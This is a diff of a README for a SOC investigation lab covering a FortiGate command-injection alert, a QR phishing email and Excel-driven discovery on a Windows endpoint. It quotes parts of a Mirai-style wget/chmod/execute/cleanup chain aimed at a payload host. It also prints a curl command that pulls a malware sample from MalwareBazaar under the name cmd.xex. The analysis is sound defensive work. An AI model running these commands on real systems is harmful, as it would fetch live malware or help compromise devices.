@@ -9,9 +9,7 @@
 
 ## Overview
 
-This project documents a SOC alert investigation lab covering three security cases: a FortiGate command-injection alert, a QR-code phishing email, and suspicious endpoint discovery activity in Microsoft Sentinel/Sysmon.
-
-The investigation focuses on what the evidence proves, what remains unconfirmed, which follow-up checks are required, and how the activity maps to MITRE ATT&CK and the Cyber Kill Chain. Each case is written as an analyst report with screenshots, technical context, and a final case assessment.
+This project documents three SOC investigations: a FortiGate command-injection alert, a QR-code phishing email, and suspicious endpoint discovery in Microsoft Sentinel/Sysmon. Each case focuses on confirmed evidence, evidence limits, MITRE ATT&CK mapping, and practical follow-up actions.
 
 ## Investigation Goals
 
@@ -43,9 +41,7 @@ The investigation focuses on what the evidence proves, what remains unconfirmed,
 
 ## Case 1 - FortiGate Command Injection
 
-The first case starts with a FortiGate IPS event: external source `195.1.144.109` sends an HTTP request to the public web service `web.seesec.co.il`. The URL is the key evidence because it contains shell-style syntax and a full command chain.
-
-The request looks like automated exploitation. It abuses a LuCI-style path, moves into `/tmp`, removes any old `shk` file, downloads a new payload, makes it executable, runs it with a `tplink` argument, and deletes it afterward. I keep the source, target, and payload host separate because each one answers a different question: who sent the request, what was targeted, and where the target would download from if execution succeeded.
+The first case starts with a FortiGate IPS event: external source `195.1.144.109` sends an HTTP request to `web.seesec.co.il`. The URL contains a LuCI-style path and shell commands that download, execute, and delete a payload named `shk`. The investigation separates the source, destination, and payload host so the scanner, protected web service, and download infrastructure are not mixed together.
 
 > Command injection means attacker-controlled input reaches an operating-system shell. In this event, the network log proves that the request was sent to the web service. It does not prove by itself that the target server executed the command.
 
@@ -58,19 +54,17 @@ The request looks like automated exploitation. It abuses a LuCI-style path, move
 
 ### Identify the Source, Destination, and Traffic Direction
 
-The first step is to identify who contacted what. The log shows the source address and hostname, destination address, and destination hostname. This establishes the basic direction of the event before analyzing the payload.
-
-Here, `195.1.144.109` is the external system initiating the request, while `web.seesec.co.il` is the protected destination service. That direction matters because the alert is not about a user browsing outward from the organization; it is about an inbound request attempting to reach a public-facing service. In SOC triage, inbound traffic with a web exploit pattern is treated very differently from normal user web browsing.
+The log first establishes direction: `195.1.144.109` is the external source and `web.seesec.co.il` is the protected destination. This is inbound web traffic against a public-facing service, not normal user browsing.
 
 ![FortiGate source and destination fields](images/01-command-injection/fortigate-source-destination-summary.png)
 
 <p><sub><strong>Screenshot 001 - FortiGate source and destination fields:</strong> The log row identifies `195.1.144.109` / `no4.nordicvm.no` as the source and `web.seesec.co.il` as the destination service.</sub></p>
 
-The screenshot gives the investigation its boundary: an outside host contacted a specific web service. It does not yet prove exploit success, but it tells the analyst where to look next: the URL payload, FortiGate action, server logs for `web.seesec.co.il`, and reputation for both the source and payload infrastructure.
+The screenshot defines the investigation boundary: an outside host contacted a specific web service. Exploit success still requires server-side evidence.
 
 ### Break Down the Injected Command Chain
 
-The strongest evidence is the request URL. It contains a command sequence that would only make sense if the attacker expected the application or device to pass input into a shell.
+The strongest evidence is the request URL because it contains a shell-style command sequence.
 
 ```text
 cd /tmp
@@ -94,8 +88,6 @@ The command chain is suspicious because every part has a clear attacker purpose:
 | `./shk tplink` | Attempts to execute the downloaded file with a TP-Link/router-related argument. |
 | `rm -rf shk` | Deletes the local payload afterward, reducing simple file-system evidence. |
 
-This is why the URL is stronger evidence than the connection alone. A single HTTP request to a website can be benign, but a request carrying download, permission-change, execution, and cleanup commands is exploitation behavior.
-
 ![Injected LuCI request and payload command](images/01-command-injection/injected-luci-request-url.png)
 
 <p><sub><strong>Screenshot 002 - Injected LuCI request and payload command:</strong> The request URL contains shell metacharacters, a `wget` payload download, executable permission changes, execution, and cleanup.</sub></p>
@@ -104,33 +96,27 @@ This is why the URL is stronger evidence than the connection alone. A single HTT
 
 ### Interpret the FortiGate Action
 
-The FortiGate event shows `deviceAction=Accept`. In this log, the traffic was recorded as accepted rather than explicitly blocked, so the evidence confirms detection and logging of the malicious request but does not confirm prevention at the firewall layer.
+The FortiGate event shows `deviceAction=Accept`. The log confirms detection and logging of the malicious request, but it does not prove firewall prevention.
 
 ![FortiGate IPS action and HTTP service fields](images/01-command-injection/fortigate-ips-action-and-service.png)
 
 <p><sub><strong>Screenshot 003 - FortiGate IPS action and HTTP service fields:</strong> The screenshot shows `Accept`, FortiGate IPS, destination port 80/HTTP, transfer size, and `Go-http-client/1.1`.</sub></p>
 
-`Go-http-client/1.1` often appears in automated tooling written in Go. It is not malicious by itself, but combined with the command-injection payload, it supports the idea of scripted scanning or exploitation rather than normal user browsing.
-
-The `Accept` action is an important limitation. It keeps the verdict honest: the request is malicious, but the firewall log alone does not prove that FortiGate blocked it. The correct next step is to correlate this event with web server access logs, application logs, endpoint telemetry, and outbound connections from the destination server. If the destination later reached `103.14.226.142`, that would materially increase concern.
+`Go-http-client/1.1` often appears in automated tooling written in Go. Combined with the injected command chain, it supports scripted exploitation. The next validation step is correlation with web access logs, application logs, endpoint telemetry, and outbound traffic from the server.
 
 ### Enrich the Source and Payload Indicators
 
-This enrichment has two separate indicators: the source IP that sent the request and the payload host used inside the injected command. Separating them keeps the analysis clear because each address plays a different role in the event.
+The enrichment separates the source IP that sent the request from the payload host embedded in the command.
 
 #### Analyze source IP `195.1.144.109`
 
-The source IP `195.1.144.109` is the host that initiated the HTTP request against `web.seesec.co.il`. AbuseIPDB context and the [VirusTotal report for `195.1.144.109`](https://www.virustotal.com/gui/ip-address/195.1.144.109) support treating this source as suspicious, especially when combined with the injected LuCI request and automated `Go-http-client/1.1` user agent.
-
-VirusTotal shows a lighter but still relevant reputation signal for this address: `2/91` security vendors flag it, with detections categorized as phishing or suspicious. The page also identifies the address under AS2116 / Globalconnect AS in Norway, which helps document the network owner context for the source side of the request.
-
-The lower detection ratio does not make the source safe. Public reputation is only one input. The behavior observed locally is much stronger: the source sent a web request containing a command-injection chain. Even if only a small number of vendors flag the IP, the URL payload and the community reports make it reasonable to treat the source as hostile for this incident.
+`195.1.144.109` initiated the HTTP request. The [VirusTotal report](https://www.virustotal.com/gui/ip-address/195.1.144.109) shows `2/91` vendor detections and AS2116 / Globalconnect AS context, while AbuseIPDB/community reports connect the IP to web exploit activity. The local behavior is stronger than the score: this source sent a command-injection request.
 
 ![AbuseIPDB profile for source IP](images/01-command-injection/abuseipdb-source-ip-profile.png)
 
 <p><sub><strong>Screenshot 004 - AbuseIPDB source IP profile:</strong> AbuseIPDB context supports the source IP `195.1.144.109` being suspicious.</sub></p>
 
-Additional community reports show the same source IP associated with web exploit activity, TP-Link targeting, port scanning, hacking, SQL injection, and web application attacks. One reported request is very similar to the alert pattern in this case: a LuCI path, `/tmp`, `wget`, `chmod 777`, `./shk tplink`, and cleanup commands.
+Community reports also show TP-Link probing, scanning, SQL injection, and web application attack activity similar to the LuCI/`wget`/`chmod` pattern in this case.
 
 ![Community reports for source IP](images/01-command-injection/source-ip-community-reports.png)
 
@@ -140,27 +126,23 @@ Additional community reports show the same source IP associated with web exploit
 
 #### Analyze payload host `103.14.226.142`
 
-The payload host `103.14.226.142` appears inside the injected command as the server used by `wget` to retrieve `shk`. This address is important because it represents the infrastructure the target would contact if the command executed successfully. The [VirusTotal report for `103.14.226.142`](https://www.virustotal.com/gui/ip-address/103.14.226.142) provides additional reputation context for this payload infrastructure.
-
-VirusTotal shows a stronger signal for the payload host: `10/91` security vendors flag the IP, with labels such as malware, malicious, and phishing. The address is listed under AS149136 / AALO.VN DIGITAL TECHNOLOGY JOINT STOCK COMPANY in Vietnam, separating it clearly from the source IP and supporting the conclusion that this is the payload-delivery side of the activity.
-
-This IP carries more weight than a random external domain because it is not only related by reputation; it is embedded directly inside the exploit command. If the command executed, the target would attempt to download from this address. That makes `103.14.226.142` a payload-delivery indicator, not just a background enrichment artifact.
+`103.14.226.142` appears inside the `wget` command as the payload host. The [VirusTotal report](https://www.virustotal.com/gui/ip-address/103.14.226.142) shows `10/91` detections with malware, malicious, and phishing labels under AS149136 in Vietnam. Because the IP is embedded directly in the exploit command, it is a payload-delivery indicator, not background context.
 
 ![VirusTotal result for payload host](images/01-command-injection/virustotal-payload-ip-detection.png)
 
 <p><sub><strong>Screenshot 006 - VirusTotal result for payload host:</strong> VirusTotal flags `103.14.226.142`, the host used by the injected `wget` command.</sub></p>
 
-VirusTotal and threat-intelligence context increase confidence that this payload host is malicious. The address also appears in a Mirai Botnet IOC report, which fits the router/IoT targeting suggested by the LuCI path and `tplink` argument.
+The address also appears in Mirai Botnet IOC context, matching the router/IoT pattern suggested by the LuCI path and `tplink` argument.
 
 ### Connect the Payload Host to Mirai Botnet Context
 
-Mirai-style malware commonly targets exposed network devices, routers, and IoT systems, then uses compromised devices for distributed attacks or further scanning. In this event, the payload host, the LuCI-style endpoint, and the `tplink` argument all point toward an automated botnet-style exploitation attempt.
+Mirai-style malware commonly targets exposed routers and IoT devices. Here, the payload host, LuCI-style endpoint, and `tplink` argument point toward automated botnet-style exploitation.
 
 ![Mirai botnet IOC context](images/01-command-injection/mirai-botnet-ioc-context.png)
 
 <p><sub><strong>Screenshot 007 - Mirai Botnet IOC context:</strong> The IOC report lists `103.14.226.142`, the same IP used in the injected `wget` command, under a Mirai Botnet indicator set.</sub></p>
 
-Mirai is known for abusing weak or vulnerable network-connected devices and turning them into botnet nodes. The report description mentions IOC types such as IPv4 addresses, ports, domains, and hashes, and describes capabilities such as DDoS, device compromise, and data theft.
+The report describes Mirai indicators such as IPs, ports, domains, and hashes, with capabilities including DDoS, device compromise, and data theft.
 
 ![Mirai threat description](images/01-command-injection/mirai-threat-description.png)
 
@@ -176,13 +158,11 @@ The visible behavior maps to public-facing exploitation, shell command execution
 
 <p><sub><strong>Screenshot 009 - MITRE command interpreter reference:</strong> The MITRE reference supports mapping the command-execution behavior to Command and Scripting Interpreter techniques.</sub></p>
 
-The MITRE mapping is useful because it describes behavior, not product names. The attacker attempts to exploit a public service, execute shell commands, and transfer a payload onto the target. Those behaviors remain relevant whether the protected service is a router interface, web application, or exposed management path.
+The mapping describes behavior: public-facing exploitation, shell command execution, and payload transfer.
 
 ### Define Server-Side Validation
 
-The network alert is enough to classify the request as malicious, but it is not enough to prove that `web.seesec.co.il` was compromised. The next investigation step is to move from network evidence into server-side evidence.
-
-The key validation should include web server access logs, error logs, application logs, endpoint telemetry, downloaded or modified files, and outbound connections from the server around the alert time. If the server contains traces of `wget`, `chmod`, `shk`, `/tmp`, or communication with `103.14.226.142`, then the investigation can move from attempted exploitation to likely or confirmed compromise.
+The network alert is enough to classify the request as malicious, but server compromise requires server-side proof. Validation should include web access/error logs, application logs, endpoint telemetry, file changes, and outbound connections near the alert time. Traces of `wget`, `chmod`, `shk`, `/tmp`, or traffic to `103.14.226.142` would raise the case from attempted exploitation toward likely compromise.
 
 > A firewall log shows that the request reached the security stack. Web server logs and endpoint telemetry show whether the server actually processed the request and executed the command.
 
@@ -202,11 +182,11 @@ The key validation should include web server access logs, error logs, applicatio
 
 ## Case 2 - Quishing Email
 
-The second case starts as a QR-code phishing investigation. The email asks the recipient to scan a QR code and join a Facebook group, which deserves caution because the real destination is hidden until the QR code is decoded or opened in a controlled environment.
+The second case starts as a QR-code phishing investigation. The email asks the recipient to scan a QR code and join a Facebook group, hiding the real destination until the code is decoded or opened safely.
 
-After Any.Run/sandbox and PCAP validation, the evidence supports a likely false positive for confirmed phishing. The QR code uses an ad-supported Me-QR redirect page, but the observed path reaches the legitimate Facebook domain instead of a fake credential-harvesting page. The email still has weak signals that justify triage: the sender display name is written incorrectly, the QR code hides the destination, and full email headers are unavailable.
+Any.Run/sandbox and PCAP evidence support a likely false positive for confirmed phishing. The QR code uses an ad-supported Me-QR redirect page, but the observed path reaches legitimate Facebook/Meta infrastructure instead of a fake login page. Weak signals still justify triage: incorrect sender display formatting, hidden destination, and missing full email headers.
 
-Quishing means QR-code phishing. Attackers use it because a QR image can move the user from a protected email client to a browser or mobile device, where inspection and user awareness may be weaker. Here, the delivery method is suspicious, but the verdict depends on the decoded URL, redirect behavior, network evidence, and sender validation.
+Quishing means QR-code phishing. Attackers use QR images to move users away from protected email tooling and into browsers or mobile devices where inspection can be weaker.
 
 > The alert remains valuable as a triage signal. The suspicious delivery method justified investigation, while the validated evidence does not support a malicious phishing verdict.
 
@@ -221,57 +201,55 @@ Quishing means QR-code phishing. Attackers use it because a QR image can move th
 
 ### Review the Email Lure
 
-The email uses a simple request: scan the QR code and join a Facebook group. This is a common shape for both legitimate invitations and QR phishing attempts, so the QR destination needs to be decoded before a final decision is made.
+The email asks the user to scan a QR code and join a Facebook group. This can be legitimate or malicious, so the destination must be decoded before judgment.
 
 ![Suspicious email with QR code](images/02-quishing/email-message-with-qr-code.png)
 
 <p><sub><strong>Screenshot 010 - Suspicious email with QR code:</strong> The email contains sender and recipient details plus a QR code that asks the user to follow an external path.</sub></p>
 
-The screenshot shows a social-engineering request, not a technical exploit. The user is asked to scan the QR code and continue outside the email body, so the case cannot be closed from the email alone. The QR image must be decoded and tested in a controlled environment before deciding whether it leads to phishing, a benign group invite, or an intermediate redirect service.
+The screenshot shows the delivery object only. It does not show a fake login page, attachment, malware download, or credential prompt.
 
 ### Validate the Sender Identity
 
-The sender appears as `avi.waisman@see-security.com`, but the display name is written as `avi.waisman` rather than a clean personal name. That is not enough to classify the email as malicious, but it is worth documenting because phishing emails often contain small identity-quality issues.
-
-The sender and recipient domains are also similar: `see-security.com` and `see-secure.com`. Similar-looking domains can be used in impersonation attempts, but in this lab the `see-security.com` domain is known and appears to be associated with the educational organization. That lowers the risk rating compared to an unknown lookalike domain.
+The sender address is `avi.waisman@see-security.com`, but the display name appears as `avi.waisman` instead of a clean personal name. The sender and recipient domains, `see-security.com` and `see-secure.com`, are similar enough to review, although `see-security.com` is known in this lab context.
 
 ![Sender mailbox validation result](images/02-quishing/email-address-undeliverable-check.png)
 
 <p><sub><strong>Screenshot 011 - Sender mailbox validation result:</strong> The mailbox check marks `avi.waisman@see-security.com` as undeliverable, which supports additional caution but does not prove spoofing by itself.</sub></p>
 
-The mailbox validation result is a weak signal, not a final verdict. Mailbox-checker tools can fail because of catch-all domains, anti-enumeration controls, temporary mail-server behavior, or restricted verification. Still, the result should be kept in the case because it supports a reasonable question: did this message really come from the claimed sender, or was the visible identity copied into the email?
+The mailbox result is a weak signal, not proof of spoofing. It supports follow-up header validation because mailbox checks can fail because of catch-all domains, anti-enumeration, or temporary server behavior.
 
 > Full email headers are not available, so SPF, DKIM, DMARC, and Received-path validation cannot be completed. A man-in-the-middle scenario is not supported by the current evidence; the stronger explanation is a legitimate QR redirect flow with weak sender-formatting signals.
 
 ### Decode and Inspect the QR Destination
 
-The QR code resolves to `https://qr.me-qr.com/shP847fW`. This is an intermediate QR service rather than a direct Facebook link, which explains why the first triage decision was suspicious. Redirect services can hide the final target and are frequently abused in phishing, but they are also used for legitimate QR campaigns.
+The QR code resolves to `https://qr.me-qr.com/shP847fW`, an intermediate QR redirect service. Redirectors can hide final destinations, which makes the alert plausible even when the final page may be legitimate.
 
 ![Security vendor detections for QR URL](images/02-quishing/qr-url-vendor-detections.png)
 
 <p><sub><strong>Screenshot 012 - Security vendor detections for QR URL:</strong> The decoded QR URL is checked against security vendors and receives malicious or suspicious detections.</sub></p>
 
-The reputation result is useful, but it is not the final answer. QR redirect services can receive negative reputation because they are abused by other users or because they show ad-gated redirect behavior. The analyst question is whether this specific QR link led to a fake page, a payload, or a legitimate destination during controlled testing.
+The reputation result is useful, but the key question is where this specific QR link led during controlled testing.
 
 ### Validate QR Behavior in Sandbox and PCAP Evidence
 
-The Any.Run/sandbox browser evidence shows the Me-QR intermediate page. The page does not immediately display a credential prompt; it shows a `Watch to continue` flow and a `skip` option, which is consistent with an ad-supported redirect service.
+The Any.Run/sandbox view shows a Me-QR ad gate with `Watch to continue` and a skip option, not an immediate credential prompt.
 
 ![Me-QR ad gate after QR scan](images/02-quishing/meqr-ad-gate-after-qr-scan.png)
 
 <p><sub><strong>Screenshot 013 - Me-QR ad gate after QR scan:</strong> The QR link opens an intermediate Me-QR page that requires watching or skipping an ad before continuing.</sub></p>
 
-This page may look suspicious because it interrupts the user with an ad-gated redirect, but it is not the same as credential phishing. It does not show a fake Microsoft, Facebook, bank, or corporate login page.
+The page looks suspicious, but it is ad-gated redirection rather than confirmed credential phishing.
 
-The final observed destination is `https://www.facebook.com/?locale=he_IL`, which is a legitimate Facebook domain. This supports a benign explanation: the QR code likely redirects through Me-QR to Facebook rather than to a fake login page.
+The final observed destination is `https://www.facebook.com/?locale=he_IL`, a legitimate Facebook domain.
 
 ![Facebook final destination](images/02-quishing/facebook-login-final-destination.png)
 
 <p><sub><strong>Screenshot 014 - Facebook final destination:</strong> The redirect flow reaches the legitimate `www.facebook.com` login page using the Hebrew locale.</sub></p>
 
-The final page is still a login page, so the domain must be checked carefully. In the screenshot, the browser reaches `www.facebook.com`, the real Facebook domain. A fake page would normally use a lookalike domain, unusual subdomain, newly registered host, or non-Meta infrastructure.
+The page is still a login page, so the domain matters. Here it reaches `www.facebook.com`, not a lookalike or non-Meta host.
 
-The PCAP supports the same conclusion. The capture contains DNS and TLS indicators for `qr.me-qr.com`, `cdn.me-qr.com`, Google ad/measurement domains, and then Facebook/Meta infrastructure such as `www.facebook.com`, `static.xx.fbcdn.net`, `scontent.xx.fbcdn.net`, and `accounts.meta.com`. No separate counterfeit Facebook domain or malware download is visible in the network evidence. A compact domain summary is documented in [quishing-network-evidence.md](docs/quishing-network-evidence.md).
+The PCAP supports the same conclusion: Me-QR and Google ad/measurement domains appear first, followed by Facebook/Meta infrastructure such as `www.facebook.com`, `fbcdn.net`, and `accounts.meta.com`. No counterfeit Facebook domain or malware download is visible. A compact domain summary is documented in [quishing-network-evidence.md](docs/quishing-network-evidence.md).
 
 | Observed domain group | Meaning in the investigation |
 |-----------------------|------------------------------|
@@ -279,15 +257,13 @@ The PCAP supports the same conclusion. The capture contains DNS and TLS indicato
 | Google ad and measurement domains | Consistent with the ad-gated Me-QR page shown in the sandbox. |
 | `www.facebook.com`, `fbcdn.net`, `accounts.meta.com` | Legitimate Facebook/Meta infrastructure reached after the redirect flow. |
 
-This domain sequence supports a false-positive disposition for confirmed phishing. The QR delivery method was suspicious, but the observed redirect path did not lead to a counterfeit login page or payload delivery.
+This sequence supports false positive for confirmed phishing: the delivery method was suspicious, but the observed path did not show credential harvesting or payload delivery.
 
 > The finding is suspicious QR delivery, not confirmed credential theft. The available evidence shows an ad-gated QR redirect flow that resolves to a legitimate Facebook destination.
 
 ### Define Response and Closure Actions
 
-The response should focus on validation and documentation, not immediate blocking of the known educational domain. The email should be preserved, full headers should be collected, and the sender or organization should confirm whether the QR campaign is legitimate.
-
-The QR provider should be monitored as a redirect service rather than treated as outright malicious from this evidence alone. If headers fail authentication, the sender denies the campaign, or the QR destination later changes to credential harvesting, the case should be reopened as phishing.
+The response should preserve the email, collect full headers, confirm the campaign with the sender or organization, and monitor the QR URL for destination changes. If authentication fails or the destination changes to credential harvesting, reopen the case as phishing.
 
 ### Case 2 Report
 
@@ -305,9 +281,9 @@ The QR provider should be monitored as a redirect service rather than treated as
 
 ## Case 3 - Sentinel and Sysmon Discovery
 
-The third case investigates a Microsoft Sentinel incident around discovery activity on the Windows endpoint `WIN10B`. The first visible signal is a query for `whoami` in Sysmon telemetry, but the case becomes stronger when the log fields are correlated with parent processes, process IDs, command lines, user context, and later download/cleanup activity.
+The third case investigates discovery activity on Windows endpoint `WIN10B` in Microsoft Sentinel. The first signal is `whoami` in Sysmon telemetry, but the case becomes stronger when parent processes, process IDs, command lines, user context, downloads, and cleanup activity are correlated.
 
-`whoami` is a legitimate Windows command that prints the current user context. In a SOC investigation it becomes suspicious when it appears after document execution, scripting, downloads, or lateral-movement preparation because attackers often check which user they are running as before deciding what to do next.
+`whoami` is legitimate, but it becomes suspicious when launched from Office documents or near downloads and reconnaissance because attackers often check user context before continuing.
 
 > Sysmon records detailed Windows endpoint events such as process creation and command lines. Sentinel makes that telemetry searchable with KQL, allowing the analyst to move from one suspicious command to the surrounding process timeline.
 
@@ -333,13 +309,13 @@ Sysmon
 
 <p><sub><strong>Screenshot 015 - Sentinel query for whoami activity:</strong> The Sentinel result shows multiple Sysmon process creation events where the command line contains `whoami`.</sub></p>
 
-The result set is important because every returned event has `EventID=1`, which is Sysmon's process-creation event. That means the records are not just search hits in a text log; they represent actual process executions with command-line and parent-process context.
+Each result has `EventID=1`, Sysmon's process-creation event, so these are actual process executions with command-line and parent-process context.
 
 > A command name alone is not enough for a verdict. In Sysmon, the value comes from comparing `Image`, `CommandLine`, `ProcessId`, `ParentImage`, `ParentCommandLine`, `ParentProcessId`, user, and time.
 
 ### Reconstruct the Sysmon Event Timeline
 
-The four `whoami.exe` records are reconstructed below as separate Sysmon Event ID 1 process-creation events. Splitting them into individual log entries makes the timeline easier to read and shows exactly how the behavior changes from a normal command prompt parent to suspicious Excel-driven execution.
+The four `whoami.exe` records below show the timeline changing from a normal `cmd.exe` parent to repeated Excel-driven execution.
 
 #### Event 01 - Baseline Command Prompt Execution
 
@@ -356,7 +332,7 @@ ParentCommandLine : "C:\Windows\system32\cmd.exe"
 ParentProcessId   : 4836
 ```
 
-This first event is treated as the baseline. `whoami.exe` was launched from `cmd.exe`, which is a normal parent process for manual command-line work. By itself, this event does not prove malicious activity; it gives the investigation a comparison point for the later Excel-based executions.
+This is the baseline: `whoami.exe` is launched from `cmd.exe`, which is normal for manual command-line use.
 
 > The parent process is the key detail here. `cmd.exe` is expected for a user manually typing `whoami`, while Office applications launching the same command require much closer review.
 
@@ -375,9 +351,7 @@ ParentCommandLine : "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" 
 ParentProcessId   : 9164
 ```
 
-The second event changes the investigation. `whoami.exe` is now launched by `EXCEL.EXE`, and the parent command line shows the workbook `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm`. A macro-enabled workbook spawning identity-discovery commands is suspicious because Office documents are commonly used as an initial execution method.
-
-This event suggests that `Gift.xlsm` may contain macro logic, embedded automation, or a script chain that checks the current user context after execution starts.
+The second event changes the verdict: `EXCEL.EXE` launches `whoami.exe`, and the parent command line points to `Gift.xlsm`. A macro-enabled workbook spawning identity discovery is suspicious and may indicate macro logic or embedded automation.
 
 #### Event 03 - Repeated Discovery from the Same Excel Process
 
@@ -394,9 +368,7 @@ ParentCommandLine : "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" 
 ParentProcessId   : 9164
 ```
 
-The third event repeats the same behavior sixteen seconds later. The parent process ID is still `9164`, which means the same Excel process is launching another `whoami.exe` instance. This repetition makes the activity more suspicious than a single accidental command.
-
-Repeated user-discovery commands can indicate a script checking execution context, confirming permissions, or preparing for the next stage of activity.
+The third event repeats the same behavior sixteen seconds later from the same Excel parent process ID `9164`, suggesting scripted or repeated execution context checks.
 
 #### Event 04 - Later Excel Process Repeats the Pattern
 
@@ -413,21 +385,19 @@ ParentCommandLine : "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" 
 ParentProcessId   : 2852
 ```
 
-The fourth event happens later and uses a different Excel parent process ID, `2852`. The parent command line still points to the same workbook path, so the pattern continues even after the original Excel parent process changes.
-
-This supports the conclusion that the workbook-related activity is not a one-time artifact. The repeated Excel-to-`whoami` pattern should be treated as suspicious endpoint behavior and investigated together with the later `curl`, ping, and cleanup commands.
+The fourth event uses a later Excel parent process ID, `2852`, but still points to `Gift.xlsm`. The repeated Excel-to-`whoami` pattern should be investigated with the later `curl`, ping, and cleanup commands.
 
 > The case is not built on `whoami.exe` being malicious. The case is built on how, when, and from where `whoami.exe` was launched.
 
 ### Compare Process IDs, Timing, and Parent Process Context
 
-The process IDs and parent process IDs confirm that Sentinel is not showing the same row repeatedly. Four separate `whoami.exe` processes are visible: `6972`, `3344`, `8388`, and `5792`.
+The process IDs confirm that Sentinel is showing four separate `whoami.exe` executions: `6972`, `3344`, `8388`, and `5792`.
 
 ![Changing whoami process IDs](images/03-sentinel-sysmon/changing-whoami-process-ids.png)
 
 <p><sub><strong>Screenshot 016 - Changing process IDs:</strong> The repeated `whoami` executions use different process IDs, showing multiple executions rather than one static event.</sub></p>
 
-The parent-process relationship is the strongest part of the log review. The first parent is `cmd.exe`, but the later parents are `EXCEL.EXE`. Two of the Excel-launched events share `ParentProcessId=9164`, and the later one uses `ParentProcessId=2852`, which suggests repeated workbook execution or a later Excel instance.
+The parent process is the key difference: the first event comes from `cmd.exe`, while later events come from `EXCEL.EXE`. Two share `ParentProcessId=9164`, and one later event uses `2852`.
 
 ![Excel parent process and repeated timestamps](images/03-sentinel-sysmon/excel-parent-process-and-event-times.png)
 
@@ -437,23 +407,23 @@ The parent-process relationship is the strongest part of the log review. The fir
 
 <p><sub><strong>Screenshot 018 - Repeated whoami time sequence:</strong> Three suspicious `whoami` executions occur around 12:14 PM and 12:38 PM after the earlier baseline event.</sub></p>
 
-The timing matters. The first `whoami` event at 7:50 AM can be interpreted as normal command-line usage, but the later events appear after `Gift.xlsm` activity and are close enough together to support a repeated discovery pattern.
+The first `whoami` at 7:50 AM can be normal. The later Excel-linked events support repeated discovery tied to `Gift.xlsm`.
 
 ### Expand the Timeline Beyond `whoami`
 
-The deeper timeline shows more suspicious activity from the same user context. This does not prove every process is malicious, but it gives the analyst more context around the workbook and the user account.
+The deeper timeline adds context around the same user, workbook, downloads, and cleanup-related activity.
 
 ![Elevated command context](images/03-sentinel-sysmon/elevated-command-context.png)
 
 <p><sub><strong>Screenshot 019 - Elevated command context:</strong> The command line shows `C:\Users\Jim.WIN10B\Downloads\OfficeSetup.exe` with an `ELEVATED` context and a user SID.</sub></p>
 
-An elevated installer command is not automatically malicious, but it raises the importance of checking whether the user intentionally ran an installer, whether the file hash is trusted, and whether the elevation happened near the suspicious workbook activity.
+The elevated installer is not automatically malicious, but its hash, source, and timing should be reviewed.
 
 ![OneDrive update command](images/03-sentinel-sysmon/onedrive-update-command.png)
 
 <p><sub><strong>Screenshot 020 - OneDrive-related command:</strong> The command uses `cmd.exe /q /c del /q` to delete `C:\Users\Jim.WIN10B\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe`.</sub></p>
 
-Deleting an updater from a user profile can be legitimate maintenance or suspicious cleanup depending on timing. In this case it is reviewed because the same user timeline also contains Excel-launched discovery and downloaded files.
+Deleting an updater can be maintenance or cleanup; here it matters because it appears near Excel-launched discovery and downloads.
 
 ![Cleanmgr autoclean command](images/03-sentinel-sysmon/cleanmgr-autoclean-command.png)
 
@@ -463,11 +433,11 @@ Deleting an updater from a user profile can be legitimate maintenance or suspici
 
 <p><sub><strong>Screenshot 022 - CCleaner and Office process activity:</strong> The process list includes `CCleaner64.exe /MONITOR`, `CCleaner.exe /MONITOR /uac`, Microsoft Edge subprocesses, and Office activity.</sub></p>
 
-Cleanup tools are not automatically malicious. The reason they matter here is timing and context: they appear after suspicious discovery and Office-linked execution.
+Cleanup tools are not automatically malicious, but the timing supports review.
 
 ### Review Internal Checks and External Downloads
 
-This part of the timeline adds two behaviors: internal reachability checks and file-transfer activity. `ping` tests whether internal hosts respond, while `curl -o` downloads remote content to a chosen local filename. Both tools are legitimate, but here they appear beside Excel-driven discovery and downloaded Office content.
+This part adds internal reachability checks and file-transfer activity. `ping` checks host response, while `curl -o` downloads remote content to a chosen filename. Both are legitimate tools, but the surrounding Excel activity makes the sequence suspicious.
 
 > The concern is the sequence, not one command: Excel opens `Gift.xlsm`, `whoami` runs from Excel, internal systems are checked, and external files are downloaded with command-line tools.
 
@@ -484,7 +454,7 @@ ping dc.local.course
 whoami
 ```
 
-`dc` and `dc.local.course` point to a domain-controller naming pattern, while `10.10.10.10` looks like an internal lab IP address. This can happen during troubleshooting, but in this timeline it also fits internal reconnaissance: checking domain-controller reachability, DNS resolution, and the current user context before a next step. The screenshot does not prove lateral movement; it proves internal reachability checks near suspicious Excel and `whoami` activity.
+`dc`, `dc.local.course`, and `10.10.10.10` indicate internal reachability checks. This does not prove lateral movement, but it fits reconnaissance near suspicious Excel and `whoami` activity.
 
 ![Curl download and ping activity](images/03-sentinel-sysmon/curl-download-and-ping-activity.png)
 
@@ -496,23 +466,17 @@ The second visible group is external file transfer:
 curl -o cmd.xex https://bazaar.abuse.ch/download/69583b9a85076bf1690ef00fceeb77ac998a991375d8ee809ec2fa037f09f3e4/
 ```
 
-The command downloads content from `bazaar.abuse.ch` and saves it as `cmd.xex`. That is suspicious because the endpoint appears to pull a sample-like object from a malware-research platform and store it under a name that resembles the legitimate Windows command interpreter `cmd.exe`.
-
-The behavior maps to [MITRE ATT&CK T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) because `curl` brings an external file onto the host. The filename also resembles [T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/): `cmd.xex` is close to `cmd.exe` but is a different file. That pattern is common in Trojan-style delivery, where a suspicious payload receives a familiar-looking name.
-
-`bazaar.abuse.ch` is associated with MalwareBazaar, an abuse.ch project used by researchers and defenders to share malware samples and intelligence. The site itself is legitimate for research, but a user endpoint downloading from its `/download/` path is high-signal activity. The screenshot confirms the command, but file collection, hashing, and execution telemetry are still needed to prove whether `cmd.xex` downloaded or executed.
+The command downloads from `bazaar.abuse.ch` and saves the file as `cmd.xex`, a name close to trusted `cmd.exe`. This maps to [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) and resembles [T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/). MalwareBazaar is legitimate for research, but a user endpoint downloading from its `/download/` path is high-signal. File collection and execution telemetry are still needed to prove whether `cmd.xex` downloaded or ran.
 
 ![VirusTotal detection for bazaar.abuse.ch](images/03-sentinel-sysmon/virustotal-bazaar-abuse-domain-detection.png)
 
